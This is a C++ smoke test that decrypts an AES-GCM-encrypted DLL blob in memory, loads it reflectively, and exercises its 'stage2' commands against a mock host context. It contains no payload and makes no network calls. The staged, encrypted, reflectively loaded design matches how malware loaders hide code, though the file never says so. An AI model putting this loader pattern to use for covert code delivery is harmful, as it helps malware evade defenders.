// stage2_test.cpp — standalone smoke test for the stage-2 pipeline.
//
// Does end-to-end:
//   1. Read Stage2Sample.bin from disk
//   2. Derive key from the dev-token
//   3. AES-GCM decrypt -> recover DLL image in memory
//   4. Reflective-load the DLL
//   5. Resolve Stage2Init export
//   6. Call it with a mock HostCtx that captures log/send calls
//   7. Invoke registered "stage2_ping" and "stage2_echo" commands
//   8. Print captured log/send output
//
// Success criteria: the test prints "PASS" at the end and exits 0.
//
// Build: this is a separate target Stage2Test in CMakeLists.txt.

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <cstdio>
#include <cstdint>
#include <string>
#include <vector>
#include <map>

#include "aes_gcm.h"
#include "reflective_loader.h"
#include "stage2_abi.h"

// ── Read entire file ───────────────────────────────────────────────────
static std::vector<uint8_t> read_file(const char* path) {
    std::vector<uint8_t> out;
    FILE* f = fopen(path, "rb");
    if (!f) return out;
    fseek(f, 0, SEEK_END);
    long n = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (n > 0) {
        out.resize((size_t)n);
        fread(out.data(), 1, n, f);
    }
    fclose(f);
    return out;
}

// ── Mock host context ──────────────────────────────────────────────────
struct MockHost {
    std::vector<std::string> logs;
    std::vector<std::string> sends;
    std::map<std::string, std::pair<Stage2CommandFn, void*>> cmds;
    std::string room_token = "dev-token";
};
static MockHost g_mock;

static void mock_log(int level, const char* msg) {
    char buf[1024];
    _snprintf_s(buf, sizeof(buf), _TRUNCATE, "[log L%d] %s", level, msg);
    g_mock.logs.push_back(buf);
    printf("  %s\n", buf);
}
static void mock_send(const char* json) {
    g_mock.sends.push_back(json);
    printf("  [send] %s\n", json);
}
static void mock_send_bin(const uint8_t*, size_t n, const char* hint) {
    printf("  [send_bin] type=%s bytes=%zu\n", hint ? hint : "", n);
}
static void mock_register_cmd(const char* name, Stage2CommandFn fn, void* ctx) {
    g_mock.cmds[name] = {fn, ctx};
    printf("  [register] cmd=%s\n", name);
}
static const char* mock_get_config(const char*) { return nullptr; }
static int mock_get_config_int(const char*, int def) { return def; }

// ──────────────────────────────────────────────────────────────────────
int main(int argc, char** argv) {
    const char* blob_path = (argc > 1) ? argv[1]
                                       : "build\\stage2\\Stage2Sample.bin";
    const char* token     = (argc > 2) ? argv[2] : "dev-token";

    printf("[1] Reading %s\n", blob_path);
    auto blob = read_file(blob_path);
    if (blob.empty()) {
        printf("FAIL: cannot read blob\n");
        return 1;
    }
    printf("    blob size: %zu bytes\n", blob.size());

    printf("[2] Deriving key from token '%s'\n", token);
    auto key = aesgcm::derive_key(token);
    printf("    key len: %zu\n", key.size());

    printf("[3] AES-GCM decrypting\n");
    std::vector<uint8_t> pt;
    if (!aesgcm::decrypt(key.data(), key.size(), blob.data(), blob.size(), pt)) {
        printf("FAIL: decrypt failed (wrong key or tampered blob)\n");
        return 1;
    }
    printf("    plaintext size: %zu bytes\n", pt.size());
    if (pt.size() < 2 || pt[0] != 'M' || pt[1] != 'Z') {
        printf("FAIL: plaintext is not a PE file\n");
        return 1;
    }
    printf("    plaintext has MZ header: OK\n");

    printf("[4] Reflective-loading PE image\n");
    std::string err;
    auto mod = pe::load(pt.data(), pt.size(), &err);
    if (!mod.valid()) {
        printf("FAIL: reflective load failed: %s\n", err.c_str());
        return 1;
    }
    printf("    loaded at %p, size=%zu\n", (void*)mod.base, mod.size);

    printf("[5] Looking up Stage2Init export\n");
    auto init_fn = (Stage2InitFn)pe::get_proc(mod, STAGE2_INIT_EXPORT);
    if (!init_fn) {
        printf("FAIL: Stage2Init export not found\n");
        pe::unload(mod);
        return 1;
    }
    printf("    Stage2Init at %p\n", (void*)init_fn);

    printf("[6] Building mock HostCtx and calling Stage2Init\n");
    Stage2HostCtx host = {};
    host.abi_version    = STAGE2_ABI_VERSION;
    host.log            = mock_log;
    host.send           = mock_send;
    host.send_bin       = mock_send_bin;
    host.register_cmd   = mock_register_cmd;
    host.get_config     = mock_get_config;
    host.get_config_int = mock_get_config_int;
    host.room_token     = g_mock.room_token.c_str();

    int rc = init_fn(&host);
    printf("    Stage2Init returned %d\n", rc);
    if (rc != 0) {
        printf("FAIL: Stage2Init non-zero\n");
        pe::unload(mod);
        return 1;
    }

    printf("[7] Invoking registered commands\n");
    bool ping_ok = false, echo_ok = false;
    if (auto it = g_mock.cmds.find("stage2_ping"); it != g_mock.cmds.end()) {
        it->second.first("{}", it->second.second);
        ping_ok = !g_mock.sends.empty() &&
                  g_mock.sends.back().find("stage2_ping") != std::string::npos;
    }
    size_t pre = g_mock.sends.size();
    if (auto it = g_mock.cmds.find("stage2_echo"); it != g_mock.cmds.end()) {
        it->second.first("{\"x\":42}", it->second.second);
        echo_ok = g_mock.sends.size() > pre &&
                  g_mock.sends.back().find("\"x\":42") != std::string::npos;
    }

    printf("[8] Calling Stage2Shutdown (if exported)\n");
    if (auto shut = (Stage2ShutdownFn)pe::get_proc(mod, STAGE2_SHUTDOWN_EXPORT)) {
        shut();
    }

    printf("[9] Unloading module\n");
    pe::unload(mod);

    printf("\n── SUMMARY ────────────────────────────\n");
    printf("  logs captured:     %zu\n", g_mock.logs.size());
    printf("  sends captured:    %zu\n", g_mock.sends.size());
    printf("  cmds registered:   %zu\n", g_mock.cmds.size());
    printf("  ping response OK:  %s\n", ping_ok ? "yes" : "NO");
    printf("  echo response OK:  %s\n", echo_ok ? "yes" : "NO");

    bool pass = ping_ok && echo_ok && g_mock.cmds.size() >= 2;
    printf("\n%s\n", pass ? "PASS" : "FAIL");
    return pass ? 0 : 1;
}
